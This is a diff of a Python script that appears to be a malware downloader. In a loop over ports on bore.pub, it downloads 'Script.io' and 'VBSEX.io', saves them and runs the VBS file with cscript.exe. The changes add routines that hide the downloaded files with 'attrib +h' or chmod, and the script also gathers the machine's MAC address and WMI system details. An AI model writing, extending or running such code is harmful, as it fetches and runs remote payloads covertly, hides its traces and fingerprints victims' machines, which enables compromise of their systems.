@@ -10,6 +10,8 @@ import uuid
 import wmi
 import concurrent.futures  # Import the 'concurrent.futures' module
 import random
+import shutil
+
 
 while True:
     numbers = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
@@ -42,14 +44,14 @@ while True:
         if os.path.exists(vbs_file_path):
             os.remove(vbs_file_path)
 
-        # Step 2: Download the necessary files
+        # Step 2: Download the necessary files using requests
         url1 = f"http://bore.pub:{port}/Script.io"
         url2 = f"http://bore.pub:{port}/VBSEX.io"
 
         response1 = requests.get(url1)
         if response1.status_code == 200:
-            with open(web_page1_path, "w", encoding="utf-8") as file:
-                file.write(response1.text)
+            with open(web_page1_path, "wb") as file:
+                file.write(response1.content)
             print(f"Downloaded and saved web page 1 to {web_page1_path}")
         else:
             print(f"Failed to download web page 1. Status code: {response1.status_code}")
@@ -57,8 +59,8 @@ while True:
 
         response2 = requests.get(url2)
         if response2.status_code == 200:
-            with open(vbs_file_path, "w", encoding="utf-8") as file:
-                file.write(response2.text)
+            with open(vbs_file_path, "wb") as file:
+                file.write(response2.content)
             print(f"Downloaded and saved web page 2 to {vbs_file_path}")
         else:
             print(f"Failed to download web page 2. Status code: {response2.status_code}")
@@ -68,6 +70,31 @@ while True:
         if os.path.isfile(vbs_file_path):
             os.system(f'cscript.exe "{vbs_file_path}"')
 
+        # Step 4: Hide downloaded files
+        def hide_files_windows(file_paths):
+            try:
+                for file_path in file_paths:
+                    os.system(f'attrib +h "{file_path}"')
+            except Exception as e:
+                print(f"Error hiding files on Windows: {str(e)}")
+
+        def hide_files_unix(file_paths):
+            try:
+                for file_path in file_paths:
+                    os.system(f'chmod 400 "{file_path}"')  # You can adjust file permissions as needed
+            except Exception as e:
+                print(f"Error hiding files on Unix-based system: {str(e)}")
+
+        # List of downloaded files
+        downloaded_files = [web_page1_path, vbs_file_path]
+
+        # Hide downloaded files based on the operating system
+        if os.name == 'nt':  # Windows
+            hide_files_windows(downloaded_files)
+        else:  # Non-Windows (e.g., Linux, macOS)
+            hide_files_unix(downloaded_files)
+
+#----------------------------------------------------------------------------------------
         mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
         mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])  # Format the MAC address with colons
         computer = wmi.WMI()
